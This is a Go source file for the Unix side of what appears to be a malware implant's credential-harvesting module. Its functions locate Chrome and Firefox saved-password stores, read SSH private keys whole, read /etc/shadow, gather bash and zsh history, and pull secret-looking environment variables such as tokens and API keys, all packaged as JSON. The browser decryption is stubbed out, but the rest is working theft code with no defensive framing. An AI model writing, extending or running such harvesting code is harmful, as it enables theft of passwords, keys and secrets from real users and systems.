//go:build !windows
// +build !windows

package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

// Credential represents a harvested credential
type Credential struct {
	Source   string `json:"source"`
	URL      string `json:"url,omitempty"`
	Username string `json:"username"`
	Password string `json:"password"`
	Type     string `json:"type"`
}

// DumpLSASS is not applicable on Unix systems
func (i *Implant) DumpLSASS() ([]byte, error) {
	return json.Marshal(map[string]interface{}{
		"status": "error",
		"error":  "LSASS dumping is Windows-specific",
	})
}

// HarvestChromePasswords harvests saved passwords from Chrome on Linux/macOS
func (i *Implant) HarvestChromePasswords() ([]byte, error) {
	credentials := []Credential{}

	currentUser, err := user.Current()
	if err != nil {
		return nil, err
	}

	var chromePaths []string
	if fileExists(filepath.Join(currentUser.HomeDir, ".config", "google-chrome")) {
		// Linux
		chromePaths = []string{
			filepath.Join(currentUser.HomeDir, ".config", "google-chrome", "Default", "Login Data"),
		}
	} else if fileExists(filepath.Join(currentUser.HomeDir, "Library", "Application Support", "Google", "Chrome")) {
		// macOS
		chromePaths = []string{
			filepath.Join(currentUser.HomeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
		}
	}

	// Note: Chrome on Linux/macOS uses the system keyring for encryption
	// Full decryption requires libsecret (Linux) or Keychain (macOS) access

	result := map[string]interface{}{
		"source": "Chrome",
		"count":  len(credentials),
		"note":   "Chrome on Unix uses system keyring - requires additional decryption",
		"paths":  chromePaths,
	}

	return json.Marshal(result)
}

// HarvestFirefoxPasswords harvests saved passwords from Firefox
func (i *Implant) HarvestFirefoxPasswords() ([]byte, error) {
	credentials := []Credential{}

	currentUser, err := user.Current()
	if err != nil {
		return nil, err
	}

	var firefoxPath string
	if fileExists(filepath.Join(currentUser.HomeDir, ".mozilla", "firefox")) {
		// Linux
		firefoxPath = filepath.Join(currentUser.HomeDir, ".mozilla", "firefox")
	} else if fileExists(filepath.Join(currentUser.HomeDir, "Library", "Application Support", "Firefox")) {
		// macOS
		firefoxPath = filepath.Join(currentUser.HomeDir, "Library", "Application Support", "Firefox", "Profiles")
	} else {
		return nil, fmt.Errorf("Firefox not found")
	}

	// Find profiles
	profiles, err := ioutil.ReadDir(firefoxPath)
	if err != nil {
		return nil, err
	}

	profilePaths := []string{}
	for _, profile := range profiles {
		if profile.IsDir() {
			profilePath := filepath.Join(firefoxPath, profile.Name())
			loginsPath := filepath.Join(profilePath, "logins.json")
			if fileExists(loginsPath) {
				profilePaths = append(profilePaths, loginsPath)
			}
		}
	}

	result := map[string]interface{}{
		"source":   "Firefox",
		"count":    len(credentials),
		"note":     "Firefox uses NSS encryption - requires key4.db decryption",
		"profiles": profilePaths,
	}

	return json.Marshal(result)
}

// HarvestEdgePasswords is not applicable on most Unix systems
func (i *Implant) HarvestEdgePasswords() ([]byte, error) {
	return json.Marshal(map[string]interface{}{
		"source": "Edge",
		"count":  0,
		"note":   "Microsoft Edge primarily runs on Windows",
	})
}

// HarvestAllBrowsers harvests credentials from all supported browsers
func (i *Implant) HarvestAllBrowsers() ([]byte, error) {
	allCredentials := make(map[string]interface{})

	// Chrome
	chromeData, _ := i.HarvestChromePasswords()
	var chromeResult map[string]interface{}
	json.Unmarshal(chromeData, &chromeResult)
	allCredentials["chrome"] = chromeResult

	// Firefox
	firefoxData, _ := i.HarvestFirefoxPasswords()
	var firefoxResult map[string]interface{}
	json.Unmarshal(firefoxData, &firefoxResult)
	allCredentials["firefox"] = firefoxResult

	// Add SSH keys
	sshData, _ := i.HarvestSSHKeys()
	var sshResult map[string]interface{}
	json.Unmarshal(sshData, &sshResult)
	allCredentials["ssh"] = sshResult

	return json.Marshal(allCredentials)
}

// HarvestSSHKeys harvests SSH private keys
func (i *Implant) HarvestSSHKeys() ([]byte, error) {
	credentials := []Credential{}

	currentUser, err := user.Current()
	if err != nil {
		return nil, err
	}

	sshDir := filepath.Join(currentUser.HomeDir, ".ssh")
	if !fileExists(sshDir) {
		return json.Marshal(map[string]interface{}{
			"source":      "SSH",
			"count":       0,
			"credentials": credentials,
		})
	}

	// Common SSH key names
	keyNames := []string{"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"}

	for _, keyName := range keyNames {
		keyPath := filepath.Join(sshDir, keyName)
		if fileExists(keyPath) {
			keyData, err := ioutil.ReadFile(keyPath)
			if err != nil {
				continue
			}

			// Check if key is encrypted
			encrypted := strings.Contains(string(keyData), "ENCRYPTED")

			credentials = append(credentials, Credential{
				Source:   "SSH",
				URL:      keyPath,
				Username: currentUser.Username,
				Password: string(keyData),
				Type:     fmt.Sprintf("ssh_key_%s", map[bool]string{true: "encrypted", false: "plain"}[encrypted]),
			})
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":      "SSH",
		"count":       len(credentials),
		"credentials": credentials,
	})
}

// HarvestShadowFile attempts to read /etc/shadow (requires root)
func (i *Implant) HarvestShadowFile() ([]byte, error) {
	shadowPath := "/etc/shadow"

	data, err := ioutil.ReadFile(shadowPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read shadow file (requires root): %v", err)
	}

	result := map[string]interface{}{
		"source": "shadow",
		"data":   string(data),
	}

	return json.Marshal(result)
}

// HarvestBashHistory harvests bash history
func (i *Implant) HarvestBashHistory() ([]byte, error) {
	currentUser, err := user.Current()
	if err != nil {
		return nil, err
	}

	historyFiles := []string{
		filepath.Join(currentUser.HomeDir, ".bash_history"),
		filepath.Join(currentUser.HomeDir, ".zsh_history"),
		filepath.Join(currentUser.HomeDir, ".history"),
	}

	histories := make(map[string]string)

	for _, histFile := range historyFiles {
		if fileExists(histFile) {
			data, err := ioutil.ReadFile(histFile)
			if err == nil {
				histories[filepath.Base(histFile)] = string(data)
			}
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":    "bash_history",
		"histories": histories,
	})
}

// HarvestEnvVars harvests environment variables
func (i *Implant) HarvestEnvVars() ([]byte, error) {
	envVars := os.Environ()

	// Filter for potentially sensitive variables
	sensitive := []string{}
	for _, env := range envVars {
		lower := strings.ToLower(env)
		if strings.Contains(lower, "password") ||
			strings.Contains(lower, "secret") ||
			strings.Contains(lower, "key") ||
			strings.Contains(lower, "token") ||
			strings.Contains(lower, "api") {
			sensitive = append(sensitive, env)
		}
	}

	return json.Marshal(map[string]interface{}{
		"source":    "environment",
		"all_count": len(envVars),
		"sensitive": sensitive,
	})
}

// fileExists checks if a file exists
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}
